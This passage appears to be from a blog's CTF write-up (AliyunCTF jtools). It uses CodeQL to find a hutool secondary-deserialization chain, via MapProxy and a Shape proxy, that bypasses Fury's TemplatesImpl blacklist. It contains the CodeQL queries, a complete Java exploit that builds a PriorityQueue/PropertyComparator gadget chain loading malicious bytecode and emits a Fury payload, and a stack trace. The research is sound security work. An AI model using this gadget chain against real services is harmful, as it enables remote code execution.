</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> invokeMethod(readMethod, bean, EMPTY_OBJECT_ARRAY);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>fury反序列化设置了黑名单，过滤了<code>TemplatesImpl</code>类。</p>
<h1 id="deserialize">deserialize<a hidden class="anchor" aria-hidden="true" href="#deserialize">#</a></h1>
<p>想找一个二次反序列化的入口，一般名字都类似于<code>deserialize</code>等，直接文本搜索就可以了。</p>
<p><code>cn.hutool.core.convert.impl.BeanConverter</code>类的<code>convertInternal</code>方法可以反序列化，代码如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> T <span style="color:#a6e22e">convertInternal</span>(Object value) {
</span></span><span style="display:flex;"><span>................
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(value <span style="color:#66d9ef">instanceof</span> Map) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>(value <span style="color:#66d9ef">instanceof</span> ValueProvider) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>BeanUtil.<span style="color:#a6e22e">isBean</span>(value.<span style="color:#a6e22e">getClass</span>())) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (value <span style="color:#66d9ef">instanceof</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> ObjectUtil.<span style="color:#a6e22e">deserialize</span>((<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span>)((<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span>)value), <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...............
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>cn.hutool.core.convert.AbstractConverter.convert</code>会调用<code>convertInternal</code>.</p>
<p>目前链子状态：</p>
<pre tabindex="0"><code>readObject -&gt;
    getter -&gt; 
        &lt;空缺&gt; -&gt;
            AbstractConverter#convert -&gt;
                ObjectUtil.deserialize
</code></pre><p>sink好写，直接规定能够调用<code>AbstractConverter#convert</code>即可：</p>
<pre tabindex="0"><code>class Sink extends Method{
    Sink(){
        exists(MethodAccess ac|  
            ac.getCallee().getQualifiedName().matches(&#34;%cn.hutool.core.convert.AbstractConverter.convert%&#34;) and 
            this = ac.getCaller()
        )
    }
} 
</code></pre><p>source设为invokeMethod能够调用到的方法，除了以get开头的getter，还可以加上动态代理的<code>invoke</code>方法：</p>
<pre tabindex="0"><code>class Source extends Method{
    Source(){
        not this.isStatic() and 
        this.isPublic() and 
        (
            (  // getter
                this.getQualifiedName().matches(&#34;%.get%&#34;) and 
                this.hasNoParameters()
            ) 
            or 
            (  // invoke
                this.getQualifiedName().matches(&#34;%.invoke&#34;)
            )
        )
    }
} 
</code></pre><p>source和sink直接的连接条件设为如下：</p>
<pre tabindex="0"><code>predicate isSerializable(RefType rt) {
    exists(RefType ref | 
        ref.getQualifiedName().matches(&#34;java.io.Serializable&#34;) and 
        rt.extendsOrImplements(ref)    
    )
}

query predicate edges(Method a, Method b) { 
    a.polyCalls(b) and (isSerializable(a.getDeclaringType()) or a.isStatic()) and (isSerializable(b.getDeclaringType()) or b.isStatic())
}
</code></pre><p>edges条件为：a调用b，且a和b为静态方法或者在实现了Serializable接口的类内。</p>
<p>串联起来即可：</p>
<pre tabindex="0"><code>import java
import semmle.code.java.dataflow.FlowSources

class Source extends Method{
    Source(){
        not this.isStatic() and 
        this.isPublic() and 
        (
            (  // getter
                this.getQualifiedName().matches(&#34;%.get%&#34;) and 
                this.hasNoParameters()
            ) 
            or 
            (  // invoke
                this.getQualifiedName().matches(&#34;%.invoke&#34;)
            )
        )
    }
} 

class Sink extends Method{
    Sink(){
        exists(MethodAccess ac|  
            ac.getCallee().getQualifiedName().matches(&#34;%cn.hutool.core.convert.AbstractConverter.convert%&#34;) and 
            this = ac.getCaller()
        )
    }
} 

predicate isSerializable(RefType rt) {
    exists(RefType ref | 
        ref.getQualifiedName().matches(&#34;java.io.Serializable&#34;) and 
        rt.extendsOrImplements(ref)    
    )
}

query predicate edges(Method a, Method b) { 
    // a调用b，且a和b为静态方法或者在实现了Serializable接口的类内
    a.polyCalls(b) and (isSerializable(a.getDeclaringType()) or a.isStatic()) and (isSerializable(b.getDeclaringType()) or b.isStatic())
}

from Source source, Sink sink
where edges+(source, sink)
select source, source, sink, &#34;$@ $@ to $@ $@&#34; ,
source.getDeclaringType(),source.getDeclaringType().getName(),
source,source.getName(),
sink.getDeclaringType(),sink.getDeclaringType().getName(),
sink,sink.getName()
</code></pre><p>在hutool数据库内的查询结果如下：
<img alt="1" loading="lazy" src="/posts/codeql%E6%9F%A5%E6%89%BEaliyunctf-jtools%E4%B8%ADhutool%E7%9A%84%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/images/1.png">
底下三个<code>JavaRuntimeInfo</code>数据不可控，<code>DynaBean</code>中的invoke为静态方法，所以只有<code>MapProxy</code>可以用。</p>
<h1 id="mapproxy">MapProxy<a hidden class="anchor" aria-hidden="true" href="#mapproxy">#</a></h1>
<p><code>ConverterRegistry#convert</code>能调用<code>BeanConverter#convert</code>，不过限制条件很多。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#f92672">&lt;</span>T<span style="color:#f92672">&gt;</span> T <span style="color:#a6e22e">convert</span>(Type type, Object value, T defaultValue, <span style="color:#66d9ef">boolean</span> isCustomFirst) <span style="color:#66d9ef">throws</span> ConvertException {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (TypeUtil.<span style="color:#a6e22e">isUnknown</span>((Type)type) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">==</span> defaultValue) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> value;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (ObjectUtil.<span style="color:#a6e22e">isNull</span>(value)) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> defaultValue;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (TypeUtil.<span style="color:#a6e22e">isUnknown</span>((Type)type)) {
</span></span><span style="display:flex;"><span>            type <span style="color:#f92672">=</span> defaultValue.<span style="color:#a6e22e">getClass</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (value <span style="color:#66d9ef">instanceof</span> Opt) {
</span></span><span style="display:flex;"><span>            value <span style="color:#f92672">=</span> ((Opt)value).<span style="color:#a6e22e">get</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (ObjUtil.<span style="color:#a6e22e">isNull</span>(value)) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> defaultValue;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (value <span style="color:#66d9ef">instanceof</span> Optional) {
</span></span><span style="display:flex;"><span>            value <span style="color:#f92672">=</span> ((Optional)value).<span style="color:#a6e22e">orElse</span>((Object)<span style="color:#66d9ef">null</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (ObjUtil.<span style="color:#a6e22e">isNull</span>(value)) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> defaultValue;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (type <span style="color:#66d9ef">instanceof</span> TypeReference) {
</span></span><span style="display:flex;"><span>            type <span style="color:#f92672">=</span> ((TypeReference)type).<span style="color:#a6e22e">getType</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (value <span style="color:#66d9ef">instanceof</span> TypeConverter) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> ObjUtil.<span style="color:#a6e22e">defaultIfNull</span>(((TypeConverter)value).<span style="color:#a6e22e">convert</span>((Type)type, value), defaultValue);
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            Converter<span style="color:#f92672">&lt;</span>T<span style="color:#f92672">&gt;</span> converter <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getConverter</span>((Type)type, isCustomFirst);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">null</span> <span style="color:#f92672">!=</span> converter) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> converter.<span style="color:#a6e22e">convert</span>(value, defaultValue);
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                Class<span style="color:#f92672">&lt;</span>T<span style="color:#f92672">&gt;</span> rowType <span style="color:#f92672">=</span> TypeUtil.<span style="color:#a6e22e">getClass</span>((Type)type);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">null</span> <span style="color:#f92672">==</span> rowType) {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">null</span> <span style="color:#f92672">==</span> defaultValue) {
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">return</span> value;
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    rowType <span style="color:#f92672">=</span> defaultValue.<span style="color:#a6e22e">getClass</span>();
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                T result <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">convertSpecial</span>((Type)type, rowType, value, defaultValue);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">null</span> <span style="color:#f92672">!=</span> result) {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (BeanUtil.<span style="color:#a6e22e">isBean</span>(rowType)) {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">new</span> BeanConverter((Type)type)).<span style="color:#a6e22e">convert</span>(value, defaultValue);
</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> ConvertException(<span style="color:#e6db74">&#34;Can not Converter from [{}] to [{}]&#34;</span>, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{value.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getName</span>(), ((Type)type).<span style="color:#a6e22e">getTypeName</span>()});
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>总结以下条件：</p>
<ul>
<li>被代理的接口需要定义getter</li>
<li>被代理的接口为public</li>
<li>getter方法的返回值需要为Normal类（不是抽象类或接口）</li>
<li>getter方法的返回值类型需要有setter方法。</li>
</ul>
<p>综上写出搜索合适的Bean的脚本：</p>
<pre tabindex="0"><code>import java

predicate isSerializable(RefType rt) {         // 实现Serializable接口
    exists(RefType ref | 
        ref.getQualifiedName().matches(&#34;java.io.Serializable&#34;) and 
        rt.extendsOrImplements(ref)    
    )
}

predicate hasSetter(RefType rt) {     // 具有setter方法
    exists(Method m | 
        rt.hasMethod(m, rt) and 
        m.getQualifiedName().regexpMatch(&#34;.*\\.set[^\\.]+&#34;) and 
        m.isPublic() and 
        m.getReturnType().getName() = &#34;void&#34; and 
        not m.isStatic()
    )
}

predicate main(RefType rt1, RefType rt2) {    // rt2为rt1 getter的返回值类型
    exists( Method m | 
        rt1.hasMethod(m, rt1) and
        m.isPublic() and 
        m.getQualifiedName().regexpMatch(&#34;.*\\.get[^\\.]+&#34;) and 
        m.getReturnType() = rt2 and 
        m.hasNoParameters()
    )
}

from Interface sc, Class sc2        // sc为被代理接口，sc2为sc的getter的返回值类型
where sc.isPublic() and main(sc, sc2) and hasSetter(sc2) and not sc2.isAbstract()
select sc.getQualifiedName(), sc2.getQualifiedName()
</code></pre><p>结果如下：
<img alt="2" loading="lazy" src="/posts/codeql%E6%9F%A5%E6%89%BEaliyunctf-jtools%E4%B8%ADhutool%E7%9A%84%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/images/2.png">
有84组结果，第二组就可以用。代理<code>java.awt.Shape</code>接口，其getter方法<code>getBounds</code>的返回值类型<code>java.awt.Rectangle</code>有setter方法。</p>
<p>反序列化的字节数组是从MapProxy中获取的，具体逻辑在<code>MapProxy#invoke</code>中。</p>
<p>POC如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Templates templates <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
</span></span><span style="display:flex;"><span>setFieldValue(templates,<span style="color:#e6db74">&#34;_bytecodes&#34;</span>,<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{getEvilClass()});
</span></span><span style="display:flex;"><span>setFieldValue(templates,<span style="color:#e6db74">&#34;_class&#34;</span>,<span style="color:#66d9ef">null</span>);
</span></span><span style="display:flex;"><span>setFieldValue(templates,<span style="color:#e6db74">&#34;_name&#34;</span>,<span style="color:#e6db74">&#34;asd&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> tmpqueue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;&gt;</span>(2);
</span></span><span style="display:flex;"><span>tmpqueue.<span style="color:#a6e22e">add</span>(1);
</span></span><span style="display:flex;"><span>tmpqueue.<span style="color:#a6e22e">add</span>(1);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Object<span style="color:#f92672">[]</span> tmpobjects <span style="color:#f92672">=</span> (Object<span style="color:#f92672">[]</span>) getFieldValue(tmpqueue, <span style="color:#e6db74">&#34;queue&#34;</span>);
</span></span><span style="display:flex;"><span>tmpobjects<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> templates;                
</span></span><span style="display:flex;"><span>                                                     <span style="color:#75715e">// 指定getter 为getOutputProperties</span>
</span></span><span style="display:flex;"><span>Comparator<span style="color:#f92672">&lt;?&gt;</span> tmpcomparator <span style="color:#f92672">=</span> (Comparator<span style="color:#f92672">&lt;?&gt;</span>) <span style="color:#66d9ef">new</span> PropertyComparator(<span style="color:#e6db74">&#34;outputProperties&#34;</span>);                              
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>setFieldValue(tmpqueue, <span style="color:#e6db74">&#34;comparator&#34;</span>, tmpcomparator);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HashMap map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
</span></span><span style="display:flex;"><span>map.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;bounds&#34;</span>, ser(tmpqueue));                   <span style="color:#75715e">// 写入序列化数据</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>MapProxy mapProxy <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> MapProxy(map);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Shape b <span style="color:#f92672">=</span> (Shape) Proxy.<span style="color:#a6e22e">newProxyInstance</span>(           <span style="color:#75715e">// 代理Shape</span>
</span></span><span style="display:flex;"><span>        ClassLoader.<span style="color:#a6e22e">getSystemClassLoader</span>(),
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Shape.<span style="color:#a6e22e">class</span>},
</span></span><span style="display:flex;"><span>        mapProxy);
</span></span><span style="display:flex;"><span>b.<span style="color:#a6e22e">getBounds</span>();
</span></span></code></pre></div><p>调用<code>Shape#getBounds</code>即可触发反序列化加载字节码。</p>
<h1 id="拼接起来">拼接起来<a hidden class="anchor" aria-hidden="true" href="#拼接起来">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exp</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception{
</span></span><span style="display:flex;"><span>        Templates templates <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TemplatesImpl();
</span></span><span style="display:flex;"><span>        setFieldValue(templates,<span style="color:#e6db74">&#34;_bytecodes&#34;</span>,<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span>{getEvilClass()});
</span></span><span style="display:flex;"><span>        setFieldValue(templates,<span style="color:#e6db74">&#34;_class&#34;</span>,<span style="color:#66d9ef">null</span>);
</span></span><span style="display:flex;"><span>        setFieldValue(templates,<span style="color:#e6db74">&#34;_name&#34;</span>,<span style="color:#e6db74">&#34;asd&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> tmpqueue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;&gt;</span>(2);
</span></span><span style="display:flex;"><span>        tmpqueue.<span style="color:#a6e22e">add</span>(1);
</span></span><span style="display:flex;"><span>        tmpqueue.<span style="color:#a6e22e">add</span>(1);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Object<span style="color:#f92672">[]</span> tmpobjects <span style="color:#f92672">=</span> (Object<span style="color:#f92672">[]</span>) getFieldValue(tmpqueue, <span style="color:#e6db74">&#34;queue&#34;</span>);
</span></span><span style="display:flex;"><span>        tmpobjects<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> templates;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Comparator<span style="color:#f92672">&lt;?&gt;</span> tmpcomparator <span style="color:#f92672">=</span> (Comparator<span style="color:#f92672">&lt;?&gt;</span>) <span style="color:#66d9ef">new</span> PropertyComparator(<span style="color:#e6db74">&#34;outputProperties&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        setFieldValue(tmpqueue, <span style="color:#e6db74">&#34;comparator&#34;</span>, tmpcomparator);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        HashMap map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap();
</span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;bounds&#34;</span>, ser(tmpqueue));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        MapProxy mapProxy <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> MapProxy(map);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Shape b <span style="color:#f92672">=</span> (Shape) Proxy.<span style="color:#a6e22e">newProxyInstance</span>(
</span></span><span style="display:flex;"><span>                ClassLoader.<span style="color:#a6e22e">getSystemClassLoader</span>(),
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Shape.<span style="color:#a6e22e">class</span>},
</span></span><span style="display:flex;"><span>                mapProxy);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        PriorityQueue<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> queue <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PriorityQueue<span style="color:#f92672">&lt;&gt;</span>(2);
</span></span><span style="display:flex;"><span>        queue.<span style="color:#a6e22e">add</span>(1);
</span></span><span style="display:flex;"><span>        queue.<span style="color:#a6e22e">add</span>(1);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Object<span style="color:#f92672">[]</span> objects <span style="color:#f92672">=</span> (Object<span style="color:#f92672">[]</span>) getFieldValue(queue, <span style="color:#e6db74">&#34;queue&#34;</span>);
</span></span><span style="display:flex;"><span>        objects<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> b;                 <span style="color:#75715e">// 这里顺序和上面template处不同，都是要保证可以类先被调用getter。</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 指定getter 为 getBounds</span>
</span></span><span style="display:flex;"><span>        Comparator<span style="color:#f92672">&lt;?&gt;</span> comparator <span style="color:#f92672">=</span> (Comparator<span style="color:#f92672">&lt;?&gt;</span>) <span style="color:#66d9ef">new</span> PropertyComparator(<span style="color:#e6db74">&#34;bounds&#34;</span>);
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        setFieldValue(queue, <span style="color:#e6db74">&#34;comparator&#34;</span>, comparator);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Fury fury <span style="color:#f92672">=</span> Fury.<span style="color:#a6e22e">builder</span>().<span style="color:#a6e22e">withLanguage</span>(Language.<span style="color:#a6e22e">JAVA</span>).<span style="color:#a6e22e">requireClassRegistration</span>(<span style="color:#66d9ef">false</span>).<span style="color:#a6e22e">build</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> data <span style="color:#f92672">=</span> fury.<span style="color:#a6e22e">serialize</span>(queue);
</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(Base64.<span style="color:#a6e22e">getEncoder</span>().<span style="color:#a6e22e">encodeToString</span>(data));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>堆栈：</p>
<pre tabindex="0"><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties
sun.reflect.NativeMethodAccessorImpl#invoke0
sun.reflect.NativeMethodAccessorImpl#invoke
sun.reflect.DelegatingMethodAccessorImpl#invoke
java.lang.reflect.Method#invoke
com.feilong.lib.beanutils.PropertyUtilsBean#invokeMethod
com.feilong.lib.beanutils.PropertyUtilsBean#getSimpleProperty
com.feilong.lib.beanutils.PropertyUtilsBean#getSimpleProperty
com.feilong.lib.beanutils.PropertyUtilsBean#getProperty
com.feilong.lib.beanutils.PropertyUtils#getProperty
com.feilong.core.bean.PropertyValueObtainer#getDataUseApache
com.feilong.core.bean.PropertyValueObtainer#obtain
com.feilong.core.bean.PropertyUtil#getProperty
com.feilong.core.util.comparator.PropertyComparator#compare
java.util.PriorityQueue#siftDownUsingComparator
java.util.PriorityQueue#siftDown
java.util.PriorityQueue#heapify
java.util.PriorityQueue#readObject
sun.reflect.NativeMethodAccessorImpl#invoke0
sun.reflect.NativeMethodAccessorImpl#invoke
sun.reflect.DelegatingMethodAccessorImpl#invoke
java.lang.reflect.Method#invoke
java.io.ObjectStreamClass#invokeReadObject
java.io.ObjectInputStream#readSerialData
java.io.ObjectInputStream#readOrdinaryObject
java.io.ObjectInputStream#readObject0
java.io.ObjectInputStream#readObject
cn.hutool.core.io.IoUtil#readObj
cn.hutool.core.io.IoUtil#readObj
cn.hutool.core.io.IoUtil#readObj
cn.hutool.core.util.SerializeUtil#deserialize
cn.hutool.core.util.ObjectUtil#deserialize
cn.hutool.core.convert.impl.BeanConverter#convertInternal
cn.hutool.core.convert.AbstractConverter#convert
cn.hutool.core.convert.ConverterRegistry#convert
cn.hutool.core.convert.ConverterRegistry#convert
cn.hutool.core.convert.Convert#convertWithCheck
cn.hutool.core.convert.Convert#convert
cn.hutool.core.convert.Convert#convert
cn.hutool.core.map.MapProxy#invoke
com.sun.proxy.$Proxy0#getBounds
sun.reflect.NativeMethodAccessorImpl#invoke0
sun.reflect.NativeMethodAccessorImpl#invoke
sun.reflect.DelegatingMethodAccessorImpl#invoke
java.lang.reflect.Method#invoke
com.feilong.lib.beanutils.PropertyUtilsBean#invokeMethod
com.feilong.lib.beanutils.PropertyUtilsBean#getSimpleProperty
com.feilong.lib.beanutils.PropertyUtilsBean#getSimpleProperty
com.feilong.lib.beanutils.PropertyUtilsBean#getProperty
com.feilong.lib.beanutils.PropertyUtils#getProperty
com.feilong.core.bean.PropertyValueObtainer#getDataUseApache
com.feilong.core.bean.PropertyValueObtainer#obtain
com.feilong.core.bean.PropertyUtil#getProperty
com.feilong.core.util.comparator.PropertyComparator#compare
java.util.PriorityQueue#siftUpUsingComparator
java.util.PriorityQueue#siftUp
java.util.PriorityQueue#offer
java.util.PriorityQueue#add
org.apache.fury.serializer.collection.AbstractCollectionSerializer#readDifferentTypeElements
org.apache.fury.serializer.collection.AbstractCollectionSerializer#generalJavaRead
org.apache.fury.serializer.collection.AbstractCollectionSerializer#readElements
org.apache.fury.serializer.collection.CollectionSerializer#read
org.apache.fury.serializer.collection.CollectionSerializer#read
org.apache.fury.Fury#readDataInternal
org.apache.fury.Fury#readRef
org.apache.fury.Fury#deserialize
org.apache.fury.Fury#deserialize
</code></pre>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://zoiltin.github.io/">zoiltin&#39;s Blog</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
